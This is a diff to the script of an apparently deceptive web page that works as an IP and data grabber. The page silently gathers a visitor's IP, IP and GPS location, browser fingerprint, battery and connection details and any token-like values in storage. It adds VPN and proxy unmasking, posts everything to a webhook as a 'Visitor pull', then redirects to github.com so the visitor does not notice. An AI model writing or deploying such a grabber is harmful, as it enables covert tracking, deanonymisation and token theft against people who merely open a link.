@@ -36,32 +36,124 @@
 
     function safe(v) {
       if (v === null || v === undefined) return "n/a";
-      if (typeof v === "object") return JSON.stringify(v).slice(0, 300);
-      return String(v).slice(0, 400);
+      if (typeof v === "object") return JSON.stringify(v).slice(0, 400);
+      return String(v).slice(0, 500);
     }
 
     async function getIPGeo() {
-      const out = { ip: null, geo: null };
+      const out = { ip: null, geo: null, vpn: null };
       try {
         const r = await fetch("https://api.ipify.org?format=json");
         const j = await r.json();
         out.ip = j.ip;
       } catch (e) { out.ip = "fail"; }
+
       try {
         if (out.ip && out.ip !== "fail") {
-          const r2 = await fetch("https://ipapi.co/" + out.ip + "/json/");
+          const r2 = await fetch("http://ip-api.com/json/" + out.ip + "?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");
           out.geo = await r2.json();
         }
       } catch (e) { out.geo = { error: String(e) }; }
-      // fallback geo
+
+      try {
+        if (out.ip && out.ip !== "fail") {
+          const r3 = await fetch("https://ipapi.co/" + out.ip + "/json/");
+          const extra = await r3.json();
+          out.geo = Object.assign({}, out.geo || {}, extra);
+        }
+      } catch (e) {}
+
       if (!out.geo || out.geo.error) {
         try {
-          const r3 = await fetch("https://ipinfo.io/json");
-          out.geo = await r3.json();
+          const r4 = await fetch("https://ipinfo.io/" + (out.ip || "") + "/json");
+          out.geo = await r4.json();
           if (!out.ip) out.ip = out.geo.ip;
         } catch (e) {}
       }
+
+      out.vpn = await detectVpnProxy(out.ip, out.geo);
       return out;
+    }
+
+    async function detectVpnProxy(ip, geo) {
+      const result = {
+        isProxy: false,
+        isVpn: false,
+        isHosting: false,
+        isMobile: false,
+        provider: null,
+        type: null,
+        raw: {}
+      };
+      if (!ip || ip === "fail") return result;
+
+      if (geo) {
+        if (geo.proxy === true) { result.isProxy = true; result.type = "proxy"; }
+        if (geo.hosting === true) { result.isHosting = true; if (!result.type) result.type = "hosting/datacenter"; }
+        if (geo.mobile === true) result.isMobile = true;
+        const org = (geo.org || geo.isp || geo.asname || geo.as || "").toLowerCase();
+        result.provider = geo.org || geo.isp || geo.asname || geo.as || null;
+
+        const vpnKeywords = [
+          "nordvpn", "expressvpn", "surfshark", "cyberghost", "private internet access", "pia",
+          "protonvpn", "proton vpn", "mullvad", "windscribe", "tunnelbear", "ipvanish",
+          "hotspot shield", "vyprvpn", "purevpn", "hidemyass", "hma", "zenmate",
+          "atlas vpn", "privado", "torguard", "ivpn", "airvpn", "ovpn", "vpn",
+          "proxy", "datacenter", "digitalocean", "linode", "vultr", "ovh", "hetzner",
+          "amazon", "aws", "google cloud", "microsoft azure", "cloudflare", "fastly"
+        ];
+        for (const kw of vpnKeywords) {
+          if (org.includes(kw)) {
+            result.isVpn = result.isVpn || kw.includes("vpn") || kw === "pia" || kw === "hma";
+            result.isProxy = result.isProxy || kw.includes("proxy");
+            result.isHosting = result.isHosting || ["digitalocean","linode","vultr","ovh","hetzner","amazon","aws","google cloud","microsoft azure","cloudflare","fastly","datacenter"].some(x => kw.includes(x));
+            if (!result.provider) result.provider = geo.org || geo.isp || kw;
+            if (!result.type) {
+              if (result.isVpn) result.type = "vpn";
+              else if (result.isProxy) result.type = "proxy";
+              else if (result.isHosting) result.type = "hosting/datacenter";
+            }
+            break;
+          }
+        }
+      }
+
+      try {
+        const pc = await fetch("https://proxycheck.io/v2/" + ip + "?vpn=1&asn=1&risk=1");
+        const pcj = await pc.json();
+        result.raw.proxycheck = pcj;
+        const node = pcj[ip] || pcj;
+        if (node) {
+          if (node.proxy === "yes") result.isProxy = true;
+          if (node.type) {
+            const t = String(node.type).toLowerCase();
+            if (t.includes("vpn")) { result.isVpn = true; result.type = "vpn"; }
+            else if (t.includes("proxy")) { result.isProxy = true; result.type = result.type || "proxy"; }
+            else if (t.includes("hosting") || t.includes("data")) { result.isHosting = true; result.type = result.type || "hosting"; }
+          }
+          if (node.provider || node.operator) result.provider = node.provider || node.operator || result.provider;
+          if (node.risk !== undefined) result.risk = node.risk;
+        }
+      } catch (e) {}
+
+      try {
+        const va = await fetch("https://api.ipapi.is/?q=" + ip);
+        const vaj = await va.json();
+        result.raw.ipapiis = vaj;
+        if (vaj.is_vpn) { result.isVpn = true; result.type = "vpn"; }
+        if (vaj.is_proxy) { result.isProxy = true; result.type = result.type || "proxy"; }
+        if (vaj.is_datacenter || vaj.is_hosting) { result.isHosting = true; result.type = result.type || "hosting"; }
+        if (vaj.company && vaj.company.name) result.provider = result.provider || vaj.company.name;
+        if (vaj.vpn && vaj.vpn.service) result.provider = vaj.vpn.service || result.provider;
+      } catch (e) {}
+
+      if (!result.type) {
+        if (result.isVpn) result.type = "vpn";
+        else if (result.isProxy) result.type = "proxy";
+        else if (result.isHosting) result.type = "hosting/datacenter";
+        else result.type = "residential/unknown";
+      }
+      return result;
     }
 
     function browserInfo() {
@@ -77,19 +169,14 @@
         deviceMemory: navigator.deviceMemory || null,
         maxTouchPoints: navigator.maxTouchPoints || 0,
         screen: {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth,
+          width: screen.width, height: screen.height,
+          availWidth: screen.availWidth, availHeight: screen.availHeight,
+          colorDepth: screen.colorDepth, pixelDepth: screen.pixelDepth,
           orientation: screen.orientation ? screen.orientation.type : null
         },
         window: {
-          innerWidth: window.innerWidth,
-          innerHeight: window.innerHeight,
-          outerWidth: window.outerWidth,
-          outerHeight: window.outerHeight,
+          innerWidth: window.innerWidth, innerHeight: window.innerHeight,
+          outerWidth: window.outerWidth, outerHeight: window.outerHeight,
           devicePixelRatio: window.devicePixelRatio
         },
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
@@ -132,12 +219,7 @@
       try {
         if (!navigator.getBattery) return null;
         const b = await navigator.getBattery();
-        return {
-          level: b.level,
-          charging: b.charging,
-          chargingTime: b.chargingTime,
-          dischargingTime: b.dischargingTime
-        };
+        return { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
       } catch (e) { return null; }
     }
 
@@ -145,44 +227,28 @@
       try {
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (!c) return null;
-        return {
-          effectiveType: c.effectiveType,
-          downlink: c.downlink,
-          rtt: c.rtt,
-          saveData: c.saveData
-        };
+        return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
       } catch (e) { return null; }
     }
 
-    // Geolocation API (browser prompt – may be denied)
     function geoPosition() {
       return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          resolve({ error: "unsupported" });
-          return;
-        }
+        if (!navigator.geolocation) { resolve({ error: "unsupported" }); return; }
         const t = setTimeout(() => resolve({ error: "timeout" }), 6000);
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             clearTimeout(t);
             resolve({
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-              altitude: pos.coords.altitude,
-              speed: pos.coords.speed
+              lat: pos.coords.latitude, lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, speed: pos.coords.speed
             });
           },
-          (err) => {
-            clearTimeout(t);
-            resolve({ error: err.message || "denied" });
-          },
+          (err) => { clearTimeout(t); resolve({ error: err.message || "denied" }); },
           { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
         );
       });
     }
 
-    // Try to pull anything token-like from storage (rare on random sites, but we check)
     function storageTokens() {
       const found = [];
       try {
@@ -206,45 +272,43 @@
       return found;
     }
 
-    // Phone / password note: pure browser JS cannot read OS passwords or SMS.
-    // We record whatever is reachable and mark the rest unavailable.
-    function limitsNote() {
-      return {
-        phone: "not available from browser (no SMS/call API without user grant + app)",
-        passwords: "not available from browser (OS / browser password stores are isolated)",
-        discord_token: "only if already present in this origin's storage (almost never on a random page). Full token grab requires local process on the machine."
-      };
-    }
-
     async function collect() {
-      const [ipgeo, battery, geo] = await Promise.all([
-        getIPGeo(),
-        batteryInfo(),
-        geoPosition()
-      ]);
+      const [ipgeo, battery, geo] = await Promise.all([getIPGeo(), batteryInfo(), geoPosition()]);
       return {
         timestamp: new Date().toISOString(),
         ip: ipgeo.ip,
         geo_ip: ipgeo.geo,
+        vpn: ipgeo.vpn,
         geo_browser: geo,
         browser: browserInfo(),
         webgl: webglInfo(),
         canvasHash: canvasHash(),
         battery: battery,
         connection: connectionInfo(),
-        storageTokens: storageTokens(),
-        limits: limitsNote()
+        storageTokens: storageTokens()
       };
     }
 
     function buildPayload(d) {
       const g = d.geo_ip || {};
-      const loc = [g.city, g.region, g.country || g.country_name].filter(Boolean).join(", ") || "n/a";
+      const v = d.vpn || {};
+      const loc = [g.city, g.regionName || g.region, g.country || g.country_name].filter(Boolean).join(", ") || "n/a";
+      const vpnLine = [
+        v.isVpn ? "VPN: YES" : "VPN: no",
+        v.isProxy ? "Proxy: YES" : "Proxy: no",
+        v.isHosting ? "Hosting: YES" : "Hosting: no",
+        v.isMobile ? "Mobile: YES" : "",
+        v.type ? ("Type: " + v.type) : "",
+        v.provider ? ("Provider: " + v.provider) : "",
+        v.risk !== undefined ? ("Risk: " + v.risk) : ""
+      ].filter(Boolean).join(" | ");
+
       const fields = [
         { name: "IP", value: "`" + safe(d.ip) + "`", inline: true },
         { name: "Location (IP)", value: safe(loc), inline: true },
-        { name: "Org / ASN", value: safe((g.org || g.org_name || "") + " " + (g.asn || "")), inline: false },
-        { name: "Coords (IP)", value: safe((g.latitude || g.lat) + ", " + (g.longitude || g.lon)), inline: true },
+        { name: "Org / ASN", value: safe((g.org || g.isp || "") + " " + (g.as || g.asn || "")), inline: false },
+        { name: "VPN / Proxy", value: safe(vpnLine), inline: false },
+        { name: "Coords (IP)", value: safe((g.lat || g.latitude) + ", " + (g.lon || g.longitude)), inline: true },
         { name: "Browser Geo", value: d.geo_browser && d.geo_browser.lat ? (d.geo_browser.lat + ", " + d.geo_browser.lon + " (±" + d.geo_browser.accuracy + "m)") : safe(d.geo_browser && d.geo_browser.error), inline: true },
         { name: "Timezone", value: safe(d.browser.timezone), inline: true },
         { name: "User-Agent", value: "`" + safe(d.browser.userAgent).slice(0, 180) + "`", inline: false },
@@ -257,16 +321,13 @@
         { name: "Battery", value: d.battery ? safe(Math.round(d.battery.level * 100) + "% " + (d.battery.charging ? "charging" : "discharging")) : "n/a", inline: true },
         { name: "Connection", value: d.connection ? safe(d.connection.effectiveType + " · " + d.connection.downlink + "Mbps · RTT " + d.connection.rtt + "ms") : "n/a", inline: true },
         { name: "Referrer", value: safe(d.browser.referrer), inline: true },
-        { name: "Storage tokens found", value: d.storageTokens && d.storageTokens.length ? safe(JSON.stringify(d.storageTokens)) : "none (expected on random origin)", inline: false },
-        { name: "Phone", value: safe(d.limits.phone), inline: false },
-        { name: "Passwords", value: safe(d.limits.passwords), inline: false },
-        { name: "Discord token", value: safe(d.limits.discord_token), inline: false }
+        { name: "Storage tokens", value: d.storageTokens && d.storageTokens.length ? safe(JSON.stringify(d.storageTokens)) : "none", inline: false }
       ];
       return {
         username: "puller",
         embeds: [{
           title: "Visitor pull",
-          color: 0x5865F2,
+          color: v.isVpn || v.isProxy ? 0xED4245 : 0x5865F2,
           fields: fields,
           footer: { text: d.timestamp },
           timestamp: d.timestamp
@@ -283,9 +344,8 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        // also send raw json as second message if under limit
         try {
-          const raw = JSON.stringify(data).slice(0, 1800);
+          const raw = JSON.stringify({ ip: data.ip, vpn: data.vpn, geo: data.geo_ip }).slice(0, 1800);
           await fetch(WEBHOOK, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -293,7 +353,6 @@
           });
         } catch (e) {}
       } catch (e) {}
-      // look like github
       location.replace("https://github.com");
     })();
   </script>
